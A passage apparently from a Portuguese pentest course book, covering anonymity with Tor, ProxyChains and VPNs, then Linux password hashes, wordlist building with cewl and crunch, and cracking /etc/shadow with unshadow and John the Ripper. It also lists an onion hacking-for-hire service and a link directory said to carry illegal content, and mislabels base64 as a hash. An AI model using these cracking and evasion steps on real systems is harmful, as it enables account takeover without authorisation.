tor-browser-linux64-6.5.2_enUS.tar.xz<br /> <br /> Dica: Um local para instalação de programas é /opt, não é uma regra, mas uma maneira de organizar os programas instalados. Utilizando o Navegador TOR 180<br /> <br /> Navegue na pasta descompactada até o executável start-tor-browser e inicie a aplicação. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a0d5d3c5d2e0cbc1ccc9">[email&#160;protected]</a>:/opt/tor/tor-browser_en-US/Browser$ ./starttor-browser Após este comando o TOR irá realizar uma conexão e iniciará o navegador. O TOR permite encapsulamento do DNS no tunelamento, utiliza a consulta de DNS leak para realizar as consultas DNS, pois de nada adianta ter um acesso anônimo e realizar as consultas DNS no seu provedor ISP. Para verificar se realmente você está com sua rede privada, acesse algum site de serviço de IP, como o www.dnsleaktest.com. Ele deve mostrar um IP diferente do seu IP real, provavelmente um IP externo de outro país. Verificando o caminho da conexão Clique na logo do tor (cebola) para verificar o circuito que você está utilizando.<br /> <br /> 181<br /> <br /> Renovar o circuito Para renovar o circuito que você está utilizando clique na logo do TOR e clique em “New TOR Circuite for this site”.<br /> <br /> Com isso o TOR irá modificar o circuito que está sendo utilizado, atribuindo novos caminhos e IP.<br /> <br /> Dicas: (01) A “Deep Web” (sites .onion) não é uma web indexada, para navegar entre os sites é necessário ter o conhecimento dos endereços da página que você deseja acessar. Os usuários da rede tor que navegam na DeepWeb (sites .onion) geralmente são membros de fóruns e chats que são relacionados com o propósito do navegador. (02) Alguns sites úteis para navegar com privacidade e acessar páginas .onion : DuckDuckGO - https://duckduckgo.com/ É um motor de busca baseado em Paoli, Pensilvânia, ele tem a particularidade de utilizar informações de origem Crowdsourcing para melhorar a relevância dos resultados. A filosofia deste motor de pesquisa enfatiza a privacidade e não registra as informações do usuário. 182<br /> <br /> The Hidden Wiki – http://zqktlwi4fecvo6ri.onion/wiki/ É um site que usa serviços ocultos disponíveis através da rede Tor. O site tem uma coleção de links para outros sites .onion de muitas categorias (medicina, ciências ocultas, terrorismo, armas, drogas, documentos oficiais falsos, pedofilia, vídeos snuff, assassinatos) e artigos de enciclopédia em um formato wiki. PirateCrackers – https://piratecr44nh3nw4.onion.cab/ É um grupo de hackers dedicados a fornecer os melhores serviços de hackers desde 2005. É possível comprar serviços para hacking de e-mails e redes sociais. Observação: (03) Para ter uma navegação realmente anônima, não utilize o Google para realizar buscas, pois ele armazena logs de todos os acessos realizados e, de alguma forma, ele consegue rastrear a origem. Fonte: Videoaula TDI – Privacidade – Instalando e Configurando o TOR e Utilizando o TOR<br /> <br /> 2.<br /> <br /> ProxyChains<br /> <br /> Utilizando ProxyChains nosso anonimato não fica apenas limitado ao navegador e podemos utilizar todos os serviços como scanners, serviços de comunicação e serviços de acesso remoto. A teoria de como o proxychains funciona é extremamente simples: utilizando vários proxies, o seu pacote passa por um caminho pré-definido por você na configuração (como veremos mais adiante) 183<br /> <br /> antes de chegar ao destino. Quanto mais servidores proxy existirem entre você e o destino, mais difícil é rastrear o seu verdadeiro IP. Entendendo o arquivo de configuração do ProxyChains O proxychains é uma ferramenta que faz parte da suíte de programas do Kali Linux. O serviço possui um arquivo de configuração que está localizado em /etc/proxychains.conf. Vamos realizar algumas modificações nesses arquivos, mas primeiro vamos conhecer sobre algumas opções de configuração. dynamic_chain Esta opção faz com que o proxychains obedeça à ordem dos proxies na lista que você informou (veremos como fazer isso mais adiante) conectando-se a cada um deles e pulando os proxies que não estiverem respondendo. strict_chain Faz com que o proxychains use todos os proxies na ordem que foram inseridos na lista. Se algum proxy não estiver mais respondendo, o processo irá finalizar e um erro será retornado para a aplicação usando o proxychains. random_chain Quando esta opção está ativa, alguns proxies da lista são selecionados aleatoriamente e utilizados para a conexão. A quantidade de proxies selecionados é definida pela opção “chain_len”. chain_len 184<br /> <br /> Define a quantidade de proxies aleatórios a serem utilizados quando a opção “random_chain” é selecionada. quiet_mode Não mostra output da biblioteca. proxy_dns Envia as requisições DNS também através da cadeia de proxies. Observação: (01) As opções dynamic_chain, strict_chain e random_chain não podem ser utilizadas ao mesmo tempo. Portanto, quando uma delas estiver não comentada as outras duas devem ser comentadas. Além disso, a opção chain_len só pode ser não comentada quando random_chain for utilizado. Configurando o ProxyChains Neste processo iremos utilizar a opção dynamic_chain, para isto realize as alterações no arquivo seguinte alteração no arquivo /etc/ proxychains.conf, siga os passos abaixo: Comente a opção strict_chain que já vem 001 configurada por padrão: #strict_chain 002<br /> <br /> Retire o comentário da opção dynamic_chain:<br /> <br /> #dynamic_chain 185<br /> <br /> 003 Para utilizar a opção sem vazamento de dados DNS (no leak for DNS), descomente a opção proxy_dns: proxy_dns A configuração está pronta, agora podemos utilizar o serviço do ProxyChains.<br /> <br /> Utilizando ProxyChains Para que a utilização do proxychain seja bem-sucedida é necessário que o serviço Tor esteja iniciado: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="88fae7e7fcc8e3e9e4e1">[email&#160;protected]</a>:~# service tor start O uso desta aplicação é bem simples: abra o terminal e digite proxychain APLICAÇÃO_A_SER_UTLIZADA, por exemplo: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c6b4a9a9b286ada7aaaf">[email&#160;protected]</a>:~# proxychains nmap 104.31.87.52 ProxyChains-3.1 (http://proxychains.sf.net) Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-16 02:40 BST Nmap scan report for 104.31.87.52 Host is up (0.039s latency). Not shown: 996 ﬁltered ports PORT STATE SERVICE 80/tcp open http 443/tcp open https 8080/tcp open http-proxy 8443/tcp open https-alt 186<br /> <br /> Nmap done: 1 IP address (1 host up) scanned in 21.32 seconds Desta forma o NMAP utilizará a rede de tunelamento do proxychains. Fonte: Videoaula TDI – Privacidade – Utilizando ProxyChains<br /> <br /> 2.1.<br /> <br /> Adicionando Proxy no ProxyChains<br /> <br /> É possível adicionar proxy no proxychains para que sua navegação utilize mais máscaras de anonimato para que dificulte mais ainda a localização a sua origem real. Existem serviços de proxy pagos com alto desempenho como o www.proxyseo.es, e serviços gratuitos como o www.hide-my-ip.com, além disso é possível criar o seu próprio proxy anônimo remoto, por exemplo, comprando uma máquina na www.digitalocean.com e realizando a configuração do proxy. Para implementar proxy no proxychains iremos modificar o arquivo de configuração /etc/ proxychains.conf, comente os proxys do TOR no campo [ProxyList]: [ProxyList] # add proxy here ... # meanwile # defaults set to "tor" #socks4 127.0.0.1 9050 Agora no mesmo campo [ProxyList] adicione os endereços dos servidores proxies que você possui. 187<br /> <br /> [ProxyList] IP_PROXY_A_SER UTLIZADO PORTA IP_PROXY_A_SER UTLIZADO2 PORTA # meanwile # defaults set to "tor" #socks4 127.0.0.1 9050 Salve o arquivo e o proxychains irá utilizar a nova configuração. Observação: (01) Cuidado ao adicionar proxys que você não tenha o conhecimento de sua origem, pois pode ser que alguns desses seja um honeypot ou contenha serviços que podem ser prejudiciais para sua conexão. Fonte: Videoaula TDI – Privacidade – Adicionando Proxy no ProxyChains<br /> <br /> 3.<br /> <br /> Utilizando VPNs<br /> <br /> Podemos utilizar VPN para navegar com segurança, muito indicado para acessar a internet de locais públicos. O software que iremos utilizar é o openvpn, software que faz parte da suíte de ferramentas do Kali Linux. O uso de VPNs com o openvpn é simples: obtenha um arquivo .ovpn realizando o download de um arquivo de vpn gratuito no www.vpnbook.com. Depois, extraia os arquivos, abra o terminal, navegue até o local do arquivo e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5f2d30302b1f343e3336">[email&#160;protected]</a>:~/VPNBook.com-OpenVPN-US1# openvpn vpnbook-us1-tcp80.ovpn 188<br /> <br /> Tue May 16 03:09:35 2017 OpenVPN 2.4.0 [git:master/ f5bf296bacce76a8+] x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Dec 29 2016 Tue May 16 03:09:35 2017 library versions: OpenSSL 1.0.2k 26 Jan 2017, LZO 2.08 Enter Auth Username: Digite as credenciais de acesso ao serviço, espere o estabelecimento da conexão e o serviço para acesso TCP na porta 80 estarem prontos para o uso. Para testar, abra uma página de verificação de IP, como o www.dnsleaktest.com. ~#[Pensando_fora.da.caixa] Um criminoso pode utilizar Wi-Fi públicas e conectar em VPNs e proxys para realizar delitos, pois a probabilidade de que ele seja rastreado é quase impossível. Dicas:<br /> <br /> (01)<br /> <br /> Serviços de VPN gratuitos: vpnbook.com/freevpn freevpn.me/accounts<br /> <br /> (02)<br /> <br /> Serviços de VPN pagos com alto desempenho: purevpn.com ipvanish.com<br /> <br /> Fonte: Videoaula TDI – Privacidade – Utilizando VPNs<br /> <br /> 189<br /> <br /> Chapter 08<br /> <br /> 190<br /> <br /> 2. SENHAS 1.<br /> <br /> UNIDADE 08<br /> <br /> Senhas e Hash no Linux<br /> <br /> No Linux as senhas são armazenadas em dois arquivos diferentes. Veja a estrutura desses arquivos: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7a0815150e3a111b1613">[email&#160;protected]</a>:~# cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin … root: Nome do usuário, não podendo haver outro com o mesmo nome. x: Corresponde à senha do usuário, somente é possível visualizá-la no arquivo /etc/shadow, porém de forma criptografada. 0: Número de identificação (ID), assim como o usuário, é único para cada máquina Linux. O sistema utiliza este ID para manter o registro dos arquivos que o usuário é proprietário e os arquivos que o usuário pode acessar. 0: Esse é o número de identificação (ID) do grupo que o usuário pertence. Através do grupo é possível serem dadas permissões a arquivos que o usuário não é proprietário, ou para um grupo de usuários. root: É um registro de comentário, podendo ser colocado qualquer string, mas usualmente é colocado o nome do usuário. /root: Diretório ‘home’ do usuário. Este é o diretório padrão do usuário. O sistema utiliza esse diretório 191<br /> <br /> para guardar os arquivos do usuário. Ao realizar o acesso no sistema, o usuário será direcionado a esse diretório. /bin/bash: O shell padrão. Este é o programa responsável por executar os comandos executados pelo usuário no sistema. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e795888893a78c868b8e">[email&#160;protected]</a>:~# cat /etc/shadow root:$6$Bse3rRY/$bJhAiZNo0J. 3xw1JB3qp24C5wy3lxd4cCCRo1g7/0Dg0c6tWXTShNIE.LhYgfdJ mp1nvYCNiUE4HT3pﬂAUH.:17245:0:99999:7::: daemon:*:17043:0:99999:7::: bin:*:17043:0:99999:7::: sys:*:17043:0:99999:7::: … root: Nome do usuário, não podendo haver outro com o mesmo nome. $6$Bse3rRY/$bJhAiZNo0J. 3xw1JB3qp24C5wy3lxd4cCCRo1g7/0Dg0c6tWXTShNIE.LhYg fdJmp1nvYCNiUE4HT3pflAUH.: Armazenada de forma criptografada - na verdade, trata-se de um hash da senha; se houver um asterisco ou ponto de exclamação significa que a conta não possui senha, ou seja, essa conta não aceita login está travada. Comum em contas do sistema. 17245: Data da última alteração de senha, armazenada como o número de dias decorridos desde 01/01/1970. 0: Número de dias que devem se passar até que seja possível alterar a senha. 99999: Número de dias após a última alteração de senha antes que outra alteração seja requisitada. 192<br /> <br /> 7: Número de dias após a última alteração de senha antes que outra alteração seja requisitada. (vazio): Número de avisos antes da expiração da senha. Se o sistema for configurado para expirar senhas, é possível configurá-lo para avisar ao usuário que a data de expiração está se aproximando. (vazio): Número de dias que decorrerá entre a expiração da senha e o travamento da conta do usuário. Uma conta expirada não pode ser usada ou pode requerer que o usuário altere sua senha no momento do login; já uma conta desabilitada perde sua senha e só poderá ser usada novamente quando o administrador a reativar. (vazio): Data na qual a conta será desabilitada. A data é expressa como o número de dias decorridos a partir de 01/01/1970. É um campo muito útil para contas temporárias.<br /> <br /> Observações: (01) Os campos que estão vazios não estão sendo utilizados, são eles campos de configuração para expiração de senhas. (02) Os valores -1 e 99999 em alguns dos campos significam que o item em questão está desabilitado. A senha, que está no segundo campo, está criptografada. Na verdade, o que está armazenado ali não é a senha em si, mas um hash da senha, que é um valor gerado a partir de um algoritmo aplicado sobre a senha. 193<br /> <br /> O trecho $6$ indica o algoritmo de hash utilizado. Neste caso, trata-se de um hash SHA-512. Outros tipos possíveis e seus códigos são os seguintes: $1 = Algoritmo de hash MD5. $2 = Algoritmo de hash Blowfish. $2a= Algoritmo de hash eksblowfish. $5 = Algoritmo de hash SHA-256. $6 = Algoritmo de hash SHA-512. O hash trata-se de uma função matemática aplicada sobre um conjunto de dados que gera um código, conhecido como hash. Ele converte um pedaço de dado, seja grande ou pequeno, em um código de tamanho definido, como uma sequência de caracteres, denominada string. Desta forma, é possível garantir a integridade do texto ou dados que foram convertidos. Existem duas formas de gerar um hash, são elas: o hash unidirecional, conhecido como 'hash mão única': com ele é possível apenas codificar o texto, não é possível, baseado no texto já codificado, descobrir o texto original. E o hash bidirecional, conhecido como ‘hash de mão dupla': com ele é possível realizar a criação de duas funções, uma para codificar e outra para decodificar o texto. Vamos ver um exemplo de criação desses tipos de hash. 1.1.<br /> <br /> Criando um hash sha256sum – unidirecional 194<br /> <br /> O programa sha256sum foi projetado para verificar a integridade dos dados usando o SHA-256 (família SHA-2 com um compasso de 256 bits). Os hashes SHA-256 usados corretamente podem confirmar tanto a integridade quanto a autenticidade do arquivo. O sha256sum é uma aplicação que faz parte da suíte de ferramentas do Kali Linux. Para utilizá-lo, abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="097b66667d4962686560">[email&#160;protected]</a>:~# echo “senha123” | sha256sum 43a686f73c60a514732be39854324c965990f4ee68448e948a9 28d6e2b4ad0d9 Desta forma criamos o hash 43a686f73c60a514732be39854324c965990f4ee68448e94 8a928d6e2b4ad0d9 a partir do texto senha123. Agora vamos utilizar o hash para verificar a integridade de um arquivo, por exemplo, uma ISO do Kali Linux. Entre no site oficial do Kali Linux na página de download. Observe que para cada ISO disponível também é disponibilizado um hash da ISO em questão, para que seja possível ao usuário verificar a integridade do arquivo.<br /> <br /> 195<br /> <br /> Faça o download de uma ISO e guarde o hash sha256sum para a verificação. Image Name:<br /> <br /> Kali 64 bit Light hash sh256sum:<br /> <br /> 5c0f6300bf9842b724df92cb20e4637f4561ffc03029cdcb2 1af3902442ae9b0 Ao finalizar o download, navegue até o diretório onde a ISO foi baixada e digite o comando: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9ceef3f3e8dcf7fdf0f5">[email&#160;protected]</a>:~# sha256sum kali-linux-light-2017.1-amd64.iso 5c0f6300bf9842b724df92cb20e4637f4561ffc03029cdcb21af39 02442ae9b0 kali-linux-light-2017.1-amd64.iso Verifique se o hash que foi gerado é idêntico ao que foi disponibilizado na página de download. Se for idêntico, o arquivo é íntegro, caso contrário o arquivo sofreu alterações de alguma forma. 1.2.<br /> <br /> Criando um hash base64 – bidirecional<br /> <br /> O base64 é um programa que foi desenvolvido para realizar a transferência de dados binários por meios de transmissão que lida apenas com texto, por exemplo para enviar arquivos anexos por e-mail. Base64 é um grupo de esquemas de codificação de binário para textos semelhantes que representam dados binários em um formato de sequência ASCII, traduzindo-o em uma representação radix-64. O termo Base64 origina-se de uma codificação de transferência de conteúdo MIME específica.<br /> <br /> 196<br /> <br /> É uma aplicação que faz parte da suíte de ferramentas do Kali Linux. Para codificar um texto, abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1d6f7272695d767c7174">[email&#160;protected]</a>:~# echo “senha123” | base64 c2VuaGExMjMK Desta forma, geramos o hash c2VuaGExMjMK a partir do texto. Agora podemos decodificar o hash e verificar o texto. Para isso digite o seguinte comando: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4c3e2323380c272d2025">[email&#160;protected]</a>:~# echo c2VuaGExMjMK | base64 -d senha123 Observe que o hash foi decodificado e agora é possível ver o texto em sua forma natural. ~#[Pensando_fora.da.caixa] Uma vez que você possui os arquivos de senha do Linux /etc/ shadow /etc/passwd, é possível encontrar hashes similares na internet e realizando a comparação você consegue identificar se a senha já foi capturada e assim é possível obter a senha do usuário desejado. Fonte: Videoaula TDI – Trabalhando com Senhas – Senhas e Hash no Linux<br /> <br /> 2.<br /> <br /> Wordlist<br /> <br /> As wordlists possui hashes e palavras que já foram usadas por usuários em muitos sistemas e sites em todo o mundo. Pode ser que tenha acontecido alguma vulnerabilidade em algum desses serviços e alguém 197<br /> <br /> explorou esta vulnerabilidade e capturou as senhas e seus respectivos usuários e disponibilizou na web através de um arquivo, que chamamos de wordlist. Normalmente quando é realizado um ataque de bruteforce é possível passar um parâmetro para ele realizar consultas em um arquivo wordlist, em que ele irá realizar a comparação do hash alvo com todos os hash que se encontram na wordlist, sendo possível encontrar um hash idêntico ao hash do alvo e, assim, obter a senha. Existem arquivos com uma infinidade de senhas que vêm sendo alimentado cada dia mais, no Kali Linux podemos encontrar alguns arquivos de wordlist no diretório /usr/share/wordlists. A wordlist mais famosa deste diretório é o arquivo rockyou.txt, ele possui cerca de 134M e mais de 14 milhões de hash. Fonte: Videoaula TDI – Trabalhando com Senhas – Wordlists<br /> <br /> 2.1.<br /> <br /> Obtendo Wordlist na internet<br /> <br /> É possível encontrar diversos sites que disponibilizam wordlist e sites que realizam o serviço de bruteforce com wordlist especiais. PASTE BIN https://pastebin.com/<br /> <br /> 198<br /> <br /> Este site possui senhas de diversos sistemas que tiveram suas senhas vazadas e nele é possível encontrar diversos arquivos de senhas, basta realizar uma busca pelo nome do sistema, por exemplo Linkedin ou pelos nomes, como senhas e passwords. Existem listas grátis e pagas neste website. CRACK STATION https://crackstation.net/<br /> <br /> 199<br /> <br /> Este site realiza o serviço de brute-force em wordlists de forma online e gratuita e é possível também realizar o download. O dicionário de cracking principal da CrackStation possui 1,493,677,782 palavras, são 15GB de senhas para download.<br /> <br /> RAINBOW CRACK http://project-rainbowcrack.com<br /> <br /> 200<br /> <br /> Este é um dos melhores serviços encontrados online e é possível obter o software e comprar tabelas de wordlists para o software RainbowCrack. O RainbowCrack usa algoritmo de troca de tempomemória para crackear hashes. Difere dos crackers brute force hash, tornando, assim, o serviço mais eficaz. O RainbowCrack utiliza as Rainbow Tables com hashes do tipo NTLM, MD5 e SHA1. Algumas Rainbow Tables chegam a ter 690 GB de conteúdo. Cada tabela tem o valor em média de 900 USD.<br /> <br /> Dica: Verifique se o seu e-mail/usuário para algum serviço já foi hackeado e encontra-se em um banco de dados público: https://haveibeenpwned.com/<br /> <br /> 2.2.<br /> <br /> Criando uma Wordlist<br /> <br /> Durante um pentest é possível que em algum momento seja necessário utilizar wordlist para quebrar senhas e ao utilizar wordlists padrões pode ser que demore muitas horas e até dias para obter algum resultado, devido ao número de palavras que podem não ser úteis. Então, é importante que um pentester saiba como criar uma wordlist personalizada. Muitas das vezes durante o processo de penetração conhecemos bastante sobre o alvo e podemos utilizar algumas técnicas para obter resultados mais eficazes. 201<br /> <br /> 2.2.1.<br /> <br /> Utilizando o CeWL<br /> <br /> Para construir uma lista de palavras personalizada, iremos utilizar o cewl. O cewl (Custom Word List generator) é um aplicativo ruby que rastreia um determinado URL até uma profundidade especificada e retorna uma lista de palavras que podem ser usadas para crackers de senhas, como John the Ripper. Esta ferramenta faz parte da suíte de programas do Kali Linux, para capturar palavras de algum site. Abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="51233e3e25113a303d38">[email&#160;protected]</a>:~# cewl -w custom-wlist.txt -d 3 -m 6 www.guardweb.com.br CeWL 5.3 (Heading Upwards) Robin Wood (<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0f7d606d66614f6b66686621616661656e">[email&#160;protected]</a>) (https://digi.ninja/) -w: Escreve as saídas no arquivo custom-wlist.txt. -d: Indica profundidade do rastreamento no site, neste caso 3, o padrão é 2. -m: Indica o comprimento mínimo da palavra, neste caso, palavras de 6 caracteres no mínimo. www.guardweb.com.br: O site que estamos rastreando as palavras. Este comando irá rastrear o site guardweb.com.br para uma profundidade de 3 páginas, pegando palavras com pelo menos 6 letras.<br /> <br /> Observação: Este comando pode levar horas, dependendo da profundidade do rastreamento. Após a finalização do rastreamento através do site, o cewl imprime todas as palavras encontradas no 202<br /> <br /> arquivo custom-wlist.txt. Podemos, então, visualizar o arquivo com qualquer editor/visualizador de texto. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="21534e4e55614a404d48">[email&#160;protected]</a>:~# less custom-wlist.txt Treinamento Cursos Invasão system Instalando Começar Ataque Conceitos Básicos Facebook … Naturalmente, podemos usar a cewl para criar listas de palavras personalizadas para qualquer segmentação de senhas, por exemplo, se sabemos que o indivíduo que é nosso alvo é um fã de futebol, usamos a cewl para rastrear um site de futebol para pegar palavras relacionadas ao futebol. Ou seja, podemos usar o cewl para criar listas de senha específicas baseadas em praticamente qualquer área de assunto, basta rastrear um site para pegar palavras-chave potenciais. 2.2.2.<br /> <br /> Utilizando o crunch<br /> <br /> Vamos criar uma lista com o crunch, pois com ele é possível criar uma lista de palavras com base em critérios que você especificar. A saída do crunch pode ser enviada para a tela, arquivo ou para outro programa. O crunch faz parte da suíte de programas do Kali Linux, então, para utilizá-lo digite no terminal: 203<br /> <br /> <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d1a3bebea591bab0bdb8">[email&#160;protected]</a>:~# crunch 4 4 0123456789 -o wlcrunch.txt Crunch will now generate the following amount of data: 50000 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines: 10000 crunch: 100% completed generating output crunch: executa a aplicação crunch. 4: Quantidade mínima de caracteres a ser criada, no caso 4 caracteres. 4: Quantidade máxima de caracteres a ser criada, no caso 4 caracteres. 0123456789: caracteres a serem utilizado na combinação para a criação da lista, no caso todos os números. -o wlcrunch.txt: a saída do comando será armazenada no arquivo wlcrunch.txt. Este comando criou uma lista de 1000 entradas, com uma quantidade de 4 caracteres, cada entrada, com todas as combinações numéricas possíveis e imprimiu a lista no arquivo wlcrunch.txt. Podemos, então, visualizar o arquivo com qualquer editor/visualizador de texto. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2c5e4343586c474d4045">[email&#160;protected]</a>:~# less wlcrunch.txt 0000 0001 0002 0003 0004 204<br /> <br /> 0005<br /> <br /> …<br /> <br /> Combinando palavras com o crunch Agora podemos combinar uma palavra da lista gerada pelo cewl com opções da ferramenta crunch para gerar uma lista de possíveis senhas. É possível utilizar uma combinação de letras, números e caracteres especiais indicando o arquivo charset.lst, o qual está localizado no diretório /usr/share/ crunch. Com este arquivo, podemos indicar algumas opções interessantes que podemos utilizar para criar combinações em listas especificando um padrão. Veja os padrões em que podemos utilizar estas opções: @ = Indica letras minúsculas. , = Indica letras maiúsculas. % = Indica números. ^ = Indica caracteres especiais. Vamos realizar alguns testes para entender estas opções, tomando o seguinte cenário, vimos que no arquivo custom-wlist.txt existe a palavra “Cursos”, vamos supor que a senha de acesso ao painel de administração do site guardweb.com.br, do usuário ‘admin’ seja ‘<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d794a2a5a4b8a497e3939a">[email&#160;protected]</a>’, vamos indicar algumas opções para o crunch mixar a palavra “Cursos” com letras maiúsculas e minúsculas <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f88a97978cb893999491">[email&#160;protected]</a>:~# crunch 10 10 -f /usr/share/crunch/charset.lst mixalpha -t ,ursos^%@@ -o senhaadm.txt Crunch will now generate the following amount of data: 255203520 bytes 243 MB 0 GB 205<br /> <br /> 0 TB 0 PB Crunch will now generate the following number of lines: 23200320 crunch: 100% completed generating output -f /usr/share/crunch/charset.lst: -f Indica o arquivo charset.lst para ser utilizado na criação da lista. mixalpha: Indica o parâmetro de letras maiúsculas e minúsculas do arquivo charset.lst. -t ,ursos^%@@: Indica o padrão para ser criado na lista, as mudanças a serem realizadas serão apenas das opções informadas. -o senhaadm.txt: A saída do comando será armazenada no arquivo wlcrunch.txt. Observe que foi gerada uma lista com mais de 23 milhões de palavras, vamos realizar uma busca nesta lista para verificar se ele gerou a palavra que corresponde à senha. Digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="61130e0e15210a000d08">[email&#160;protected]</a>:~# cat senhaadm.txt |grep "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="561523242539251662121b">[email&#160;protected]</a>" <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d89badaaabb7ab98ec9c95">[email&#160;protected]</a> Como esperado, a palavra foi encontrada “<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="81c2f4f3f2eef2c1b5c5cc">[email&#160;protected]</a>”. Essa ferramenta é incrível, basta você usar a sua criatividade para criar listas específicas. Fonte: Videoaula TDI – Trabalhando com Senhas – Criando e Obtendo Wordlists<br /> <br /> 3.<br /> <br /> John the Ripper<br /> <br /> John the Ripper é um software para quebra de senhas. Inicialmente desenvolvido para sistemas 206<br /> <br /> unix-like, corre agora em vários sistemas operativos, como Linux, Windows, BSD. Disponível em versão gratuita e paga, o John the Ripper é capaz de fazer força bruta em senhas cifradas em DES, MD4 e MD5 entre outras. O John the Ripper possui três modos de operação: Dicionário (Wordlist): O modo mais simples suportado pelo programa, este é o conhecido ataques de dicionário, que lê as palavras de um arquivo e verifica se são correspondentes entre si. Quebra Simples (Single Crack): Indicado para início de uma quebra e mais rápido que o wordlist, este modo usa técnicas de mangling e mais informações do usuário pelo nome completo e diretório /home em combinação, para achar a senha mais rapidamente. Incremental: O modo mais robusto no John the Ripper. Ele tentará cada caractere possível até achar a senha correta, e por esse motivo é indicado o uso de parâmetros com o intuito de reduzir o tempo de quebra. Externo (External): O modo mais complexo do programa que faz a quebra a partir de regras definidas em programação no arquivo de configuração do programa, que irá préprocessar as funções no arquivo no ato da quebra quando usar o programa na linha de comando e executá-las. Esse modo é mais completo e necessita de tempo para aprender e acostumar-se. 207<br /> <br /> 3.1.<br /> <br /> John the Ripper – Single Crack<br /> <br /> Vamos realizar um teste com o John the Ripper no modo Single Crack. No sistema Linux o arquivo de senha fica localizado em /etc/shadow e o arquivo dos usuários em /etc/ passwd. No arquivo shadow contém a hash criptografada de todos os usuários do sistema. Primeiramente vamos realizar a concatenação dos arquivos de credenciais do Linux, vamos utilizar o unshadow. Digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2b5944445f6b404a4742">[email&#160;protected]</a>:~# unshadow /etc/passwd /etc/shadow > pass.txt unshadow: Executa a aplicação unshadow que combina os arquivos passwd e shadow. /etc/passwd: Indica o arquivo de usuários do Linux. /etc/shadow: Indica o arquivo de senhas de usuários do Linux. > pass.txt: > irá criar e imprimir o resultado do comando unshadow no arquivo pass.txt. Este comando irá organizar as credenciais com usuário e senha em somente um arquivo no pass.txt. Vamos agora iniciar o John the Ripper. O John the Ripper é uma ferramenta que faz parte da suíte de programas do Kali Linux. Abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e99b86869da982888580">[email&#160;protected]</a>:~# john pass.txt Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt" Use the "--format=crypt" option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) 208<br /> <br /> Remaining 4 password hashes with 4 different salts Press 'q' or Ctrl-C to abort, almost any other key for status john: Executa a aplicação John the Ripper. pass.txt: Nome do arquivo a ser analisado pelo john. Observe que ele avisa que reconheceu o tipo de hash e podemos utilizar um parâmetro específico para que o John não realize a comparação com todos os tipos de hashes que ele possui, cancele (Ctrl+C) a execução e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e5978a8a91a58e84898c">[email&#160;protected]</a>:~# john --format=sha512crypt pass.txt Using default input encoding: UTF-8 Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Remaining 4 password hashes with 4 different salts Press 'q' or Ctrl-C to abort, almost any other key for status test123 (test) john: Executa a aplicação John the Ripper. --format=sha512crypt: Indica o tipo de hash que a senha a ser quebrada está utilizando. pass.txt: Nome do arquivo a ser analisado pelo john. Observe que ele já encontrou a senha “test123” do usuário test. vamos aguardar a finalização do processo, que pode levar horas para finalizar, dependendo das senhas que são utilizadas. É possível também cancelar o processo (Ctrl+C) e ele irá armazenar as senhas que já foram encontradas. ///Após a finalização do processo, é possível verificar as informações que ele gerou em um diretório oculto o ~/.john/ são criados os arquivos john.log, 209<br /> <br /> john.pot, john.rec. Estes arquivos servem para o John consultar as execuções passadas. Para verificar as senhas que ele encontrou de um determinado arquivo, digite o comando: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7b0914140f3b101a1712">[email&#160;protected]</a>:~# john --show pass.txt root:123456:0:0:root:/root:/bin/bash test:test123:1001:1001::/home/test:/bin/false user01:user123:1002:1002:,,,:/home/user01:/bin/bash 3 password hashes cracked, 1 left john: Executa a aplicação john the ripper. --show pass.txt: Exibe os resultados gerados do arquivo pass.txt. pass.txt: Nome do arquivo a ser analisado pelo john. O comando para quebra de senhas apresentado acima faz com que o John traga informações de muitos usuários que não possuem uma shell válida. Para um atacante que deseja usar uma shell, informações desse usuário podem não ser interessantes no momento, para que o John mostre apenas usuário com uma shell válida, é possível utilizar o comando: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1c6e7373685c777d7075">[email&#160;protected]</a>:~# john --show --shells=/bin/false pass.txt root:123456:0:0:root:/root:/bin/bash user01:user123:1002:1002:,,,:/home/user01:/bin/bash 2 password hashes cracked, 1 left john: Executa a aplicação john the ripper. --show: Indica o john para imprimir os resultados 